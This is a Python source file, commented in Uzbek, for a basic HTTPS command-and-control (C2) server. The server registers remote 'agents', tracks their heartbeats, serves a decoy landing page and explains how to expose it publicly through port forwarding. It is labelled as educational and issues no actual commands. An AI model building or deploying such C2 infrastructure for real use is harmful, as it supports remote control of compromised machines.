"""
HTTPS C2 Server - Secure Encrypted Communication
SSL/TLS bilan shifrlangan aloqa
"""

import http.server
import ssl
import json
from datetime import datetime
import threading
import os
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *


class HTTPSC2Handler(http.server.BaseHTTPRequestHandler):
    """HTTPS request handler"""
    
    agents = {}
    
    def log_message(self, format, *args):
        """Custom logging"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {self.address_string()} - {format % args}")
        
    def do_GET(self):
        """GET so'rovlar"""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<h1>Secure Server</h1><p>HTTPS Active</p>")
            
        elif self.path == '/health':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            response = {'status': 'online', 'protocol': 'HTTPS'}
            self.wfile.write(json.dumps(response).encode())
            
        else:
            self.send_response(404)
            self.end_headers()
            
    def do_POST(self):
        """POST so'rovlar"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            
            # Agent registration
            if self.path == '/api/register':
                agent_id = data.get('agent_id', 'unknown')
                HTTPSC2Handler.agents[agent_id] = {
                    'ip': self.client_address[0],
                    'first_seen': datetime.now(),
                    'last_seen': datetime.now(),
                    'requests': 0
                }
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔐 HTTPS Agent: {agent_id}")
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                response = {'status': 'registered', 'agent_id': agent_id}
                self.wfile.write(json.dumps(response).encode())
                
            # Heartbeat
            elif self.path == '/api/heartbeat':
                agent_id = data.get('agent_id')
                if agent_id in HTTPSC2Handler.agents:
                    HTTPSC2Handler.agents[agent_id]['last_seen'] = datetime.now()
                    HTTPSC2Handler.agents[agent_id]['requests'] += 1
                    
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                response = {'status': 'ok', 'commands': []}
                self.wfile.write(json.dumps(response).encode())
                
            else:
                self.send_response(404)
                self.end_headers()
                
        except Exception as e:
            print(f"❌ POST xatosi: {e}")
            self.send_response(500)
            self.end_headers()


class HTTPSC2Server:
    """HTTPS C2 Server with SSL/TLS"""
    
    def __init__(self, host='0.0.0.0', port=8443, certfile=None, keyfile=None):
        self.host = host
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile
        self.server = None
        
    def generate_self_signed_cert(self):
        """Self-signed sertifikat yaratish"""
        cert_dir = os.path.join(os.path.dirname(__file__), '..', 'certs')
        os.makedirs(cert_dir, exist_ok=True)
        
        cert_file = os.path.join(cert_dir, 'server.crt')
        key_file = os.path.join(cert_dir, 'server.key')
        
        # Check if cert exists
        if os.path.exists(cert_file) and os.path.exists(key_file):
            return cert_file, key_file
            
        print("📝 Self-signed sertifikat yaratilmoqda...")
        
        try:
            # OpenSSL command
            import subprocess
            cmd = [
                'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                '-keyout', key_file, '-out', cert_file,
                '-days', '365', '-nodes',
                '-subj', '/C=UZ/ST=Tashkent/L=Tashkent/O=C2/CN=localhost'
            ]
            subprocess.run(cmd, check=True, capture_output=True)
            print(f"✅ Sertifikat yaratildi: {cert_file}")
            return cert_file, key_file
            
        except Exception as e:
            print(f"❌ Sertifikat yaratish xatosi: {e}")
            print("💡 OpenSSL o'rnatilganini tekshiring")
            return None, None
            
    def start(self):
        """HTTPS server ishga tushirish"""
        try:
            # Get or generate certificates
            if not self.certfile or not self.keyfile:
                self.certfile, self.keyfile = self.generate_self_signed_cert()
                
            if not self.certfile or not self.keyfile:
                print("❌ SSL sertifikatlar topilmadi!")
                return
                
            # Create server
            self.server = http.server.HTTPServer((self.host, self.port), HTTPSC2Handler)
            
            # SSL context
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(self.certfile, self.keyfile)
            
            # Wrap socket
            self.server.socket = context.wrap_socket(
                self.server.socket,
                server_side=True
            )
            
            print(f"\n{'='*60}")
            print(f"🎯 HTTPS C2 Server - Secure Encrypted Communication")
            print(f"⚠️  Faqat ta'lim maqsadida!")
            print(f"{'='*60}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] 🔐 HTTPS Server: {self.host}:{self.port}")
            print(f"📜 Certificate: {os.path.basename(self.certfile)}")
            print(f"🔑 Private Key: {os.path.basename(self.keyfile)}")
            print(f"\n🌐 URLs:")
            print(f"  • https://localhost:{self.port}/")
            print(f"  • https://localhost:{self.port}/health")
            print(f"  • https://localhost:{self.port}/api/register")
            print(f"\n💡 Global ulanish uchun:")
            print(f"  • Public IP: https://YOUR_PUBLIC_IP:{self.port}/")
            print(f"  • Port forwarding: Router'da {self.port} portni oching")
            print(f"  • Firewall: {self.port} portga ruxsat bering")
            print(f"{'-'*60}\n")
            
            # Start server
            print("🚀 Server ishlamoqda... (Ctrl+C to stop)\n")
            self.server.serve_forever()
            
        except FileNotFoundError:
            print("❌ Sertifikat fayllari topilmadi!")
        except PermissionError:
            print(f"❌ Port {self.port} uchun ruxsat yo'q!")
        except KeyboardInterrupt:
            print("\n\n🛑 HTTPS Server to'xtatilmoqda...")
            if self.server:
                self.server.shutdown()
            print("✅ Server to'xtatildi")
        except Exception as e:
            print(f"❌ HTTPS Server xatosi: {e}")


def show_agents():
    """Agentlarni ko'rsatish"""
    agents = HTTPSC2Handler.agents
    if not agents:
        print("📭 Agentlar yo'q")
        return
        
    print(f"\n📊 HTTPS Agents ({len(agents)}):")
    print(f"{'-'*70}")
    print(f"{'ID':<20} {'IP':<20} {'Requests':<10} {'Last Seen'}")
    print(f"{'-'*70}")
    
    for agent_id, info in agents.items():
        ip = info['ip']
        requests = info['requests']
        last_seen = info['last_seen'].strftime('%H:%M:%S')
        print(f"{agent_id:<20} {ip:<20} {requests:<10} {last_seen}")
    print()


if __name__ == "__main__":
    # HTTPS server (port 8443 - standart HTTPS alternate)
    server = HTTPSC2Server(host='0.0.0.0', port=8443)
    server.start()
